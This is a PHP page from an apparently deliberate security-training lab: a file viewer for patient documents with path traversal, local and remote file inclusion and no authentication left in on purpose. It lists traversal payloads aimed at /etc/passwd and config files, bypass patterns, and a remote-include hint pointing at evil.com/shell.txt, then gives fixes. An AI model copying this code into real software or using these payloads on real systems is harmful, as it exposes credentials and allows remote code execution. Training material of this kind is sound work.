<?php
// VULNERABLE FILE VIEWER - DIRECTORY TRAVERSAL & LFI
// WARNING: FOR TRAINING PURPOSES ONLY
// Hidden Hint: Check how filename parameter is used without validation

session_start();
include("config-vulnerable.php");
error_reporting(E_ALL);
ini_set('display_errors', 1);

// VULNERABILITY: No authentication check
// Hidden Hint: Anyone can access this page

$content = "";
$filename = "";

if(isset($_GET['file'])) {
    $filename = $_GET['file'];
    
    // VULNERABILITY #1: Directory Traversal / Path Traversal
    // Hidden Hint: Try ../../../etc/passwd
    // No path validation or sanitization
    $filepath = "documents/" . $filename;
    
    // VULNERABILITY #2: Local File Inclusion (LFI)
    // Hidden Hint: Can read any file on the system
    if(file_exists($filepath)) {
        $content = file_get_contents($filepath);
    } else {
        // Try direct path (even more vulnerable)
        // Hidden Hint: If documents/ path fails, tries absolute path
        if(file_exists($filename)) {
            $content = file_get_contents($filename);
        } else {
            $content = "File not found: " . $filename;
        }
    }
}

// VULNERABILITY #3: Remote File Inclusion possibility
// Hidden Hint: If allow_url_fopen is enabled, can include remote files
if(isset($_GET['include'])) {
    $include_file = $_GET['include'];
    // No validation on included files
    // Hidden Hint: Try include=http://evil.com/shell.txt
    include($include_file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <title>File Viewer - Directory Traversal Training</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <style>
        .warning-banner {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .file-content {
            background: #f8f9fa;
            padding: 20px;
            border: 1px solid #ddd;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 500px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        ⚠️ VULNERABLE VERSION - FOR SECURITY TRAINING ONLY ⚠️
    </div>
    
    <div class="container">
        <h2>Document Viewer</h2>
        <p class="text-muted">View patient documents and reports</p>

        <div class="alert alert-danger">
            <h5>🎯 Training Target: Directory Traversal / Path Traversal</h5>
            <p><strong>Vulnerabilities Present:</strong></p>
            <ul>
                <li>No path validation or sanitization</li>
                <li>Directory traversal using ../</li>
                <li>Local File Inclusion (LFI)</li>
                <li>Remote File Inclusion (RFI) possible</li>
                <li>No authentication required</li>
            </ul>
        </div>

        <div class="card mb-4">
            <div class="card-header">
                <h5>Select Document</h5>
            </div>
            <div class="card-body">
                <form method="get" class="mb-3">
                    <div class="form-group">
                        <label>Filename:</label>
                        <input type="text" name="file" class="form-control" 
                               placeholder="e.g., report.txt" 
                               value="<?php echo htmlspecialchars($filename); ?>">
                    </div>
                    <button type="submit" class="btn btn-primary">View File</button>
                </form>

                <div class="alert alert-warning">
                    <strong>Try These Exploits:</strong>
                    <ul>
                        <li><code>?file=../../../etc/passwd</code> - Read system password file</li>
                        <li><code>?file=../../../../etc/hosts</code> - Read hosts file</li>
                        <li><code>?file=../config-vulnerable.php</code> - Read config file</li>
                        <li><code>?file=../../../../../var/log/apache2/access.log</code> - Read logs</li>
                        <li><code>?file=/etc/passwd</code> - Absolute path</li>
                        <li><code>?file=....//....//....//etc/passwd</code> - Filter bypass</li>
                    </ul>
                </div>

                <h6>Sample Documents (Intended Use):</h6>
                <ul>
                    <li><a href="?file=report.txt">report.txt</a></li>
                    <li><a href="?file=patient_records.txt">patient_records.txt</a></li>
                    <li><a href="?file=lab_results.txt">lab_results.txt</a></li>
                </ul>
            </div>
        </div>

        <?php if($filename): ?>
        <div class="card">
            <div class="card-header">
                <h5>File Content: <?php echo htmlspecialchars($filename); ?></h5>
            </div>
            <div class="card-body">
                <div class="file-content">
                    <?php 
                    // VULNERABILITY: Displaying file content without proper encoding
                    // Hidden Hint: If PHP file is read, code is exposed
                    echo htmlspecialchars($content); 
                    ?>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="card mt-4">
            <div class="card-header bg-info text-white">
                <h5>💡 What is Directory Traversal?</h5>
            </div>
            <div class="card-body">
                <p>Directory traversal (path traversal) allows attackers to access files outside the intended directory by manipulating file paths.</p>
                
                <h6>Common Patterns:</h6>
                <pre>
../              - Go up one directory
../../           - Go up two directories  
..\\             - Windows version
....//           - Filter bypass
%2e%2e%2f        - URL encoded ../
..;/             - Bypass attempt
</pre>

                <h6>What You Can Access:</h6>
                <ul>
                    <li><strong>/etc/passwd</strong> - System users</li>
                    <li><strong>/etc/shadow</strong> - Password hashes (if permissions allow)</li>
                    <li><strong>/etc/hosts</strong> - Host configurations</li>
                    <li><strong>/var/log/*</strong> - System logs</li>
                    <li><strong>/proc/self/environ</strong> - Environment variables</li>
                    <li><strong>Application config files</strong> - Database credentials</li>
                    <li><strong>Source code</strong> - Read PHP/application files</li>
                </ul>

                <h6>🛡️ How to Fix:</h6>
                <pre>
// 1. Use whitelist of allowed files
$allowed_files = ['report.txt', 'records.txt'];
if(!in_array($filename, $allowed_files)) die("Access denied");

// 2. Use basename() to strip paths
$filename = basename($_GET['file']);

// 3. Use realpath() to resolve actual path
$realpath = realpath('documents/' . $filename);
if(strpos($realpath, realpath('documents/')) !== 0) {
    die("Access denied");
}

// 4. Never include user input directly
// Don't use include/require with user input
</pre>
            </div>
        </div>

        <div class="mt-3">
            <a href="dashboard-vulnerable.php">← Back to Dashboard</a>
        </div>
    </div>
</body>
</html>
